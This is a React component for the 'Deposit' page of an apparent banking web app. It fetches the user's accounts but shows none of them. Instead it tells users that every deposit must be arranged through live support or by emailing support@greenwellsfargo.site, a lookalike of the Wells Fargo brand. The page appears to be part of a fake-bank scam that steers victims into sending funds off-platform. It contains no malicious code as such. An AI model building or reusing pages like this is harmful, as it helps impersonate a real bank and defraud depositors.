import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { Wallet, Mail } from "lucide-react";

const SUPPORT_EMAIL = "support@greenwellsfargo.site";
type Account = { id: string; account_number: string; account_type: string; balance: number };

export default function Deposit() {
  const { user } = useAuth();
  const [, setAccounts] = useState<Account[]>([]);

  useEffect(() => {
    if (!user) return;
    supabase.from("accounts").select("*").then(({ data }) => setAccounts((data as Account[]) ?? []));
  }, [user]);

  return (
    <div className="container mx-auto p-4 md:p-8 max-w-2xl space-y-4">
      <div className="flex items-center gap-2">
        <Wallet className="w-6 h-6 text-primary" />
        <h1 className="text-2xl font-bold">Deposit</h1>
      </div>

      <Card className="p-5 space-y-3">
        <div className="font-semibold">Contact live support to make a deposit</div>
        <p className="text-sm text-muted-foreground">
          To protect your account and verify the source of funds, all deposits are processed by our live support team. Please contact our agent or email us with the deposit amount and method, and we will guide you through the secure deposit process.
        </p>
        <div className="flex flex-col sm:flex-row gap-2 pt-1">
          <Button onClick={() => { window.dispatchEvent(new CustomEvent("open-support-chat")); toast.message("Opening live support…"); }}>
            Contact live support
          </Button>
          <a href={`mailto:${SUPPORT_EMAIL}?subject=Deposit%20request`}>
            <Button variant="outline" className="w-full sm:w-auto">
              <Mail className="w-4 h-4 mr-2" />Email {SUPPORT_EMAIL}
            </Button>
          </a>
        </div>
      </Card>
    </div>
  );
}
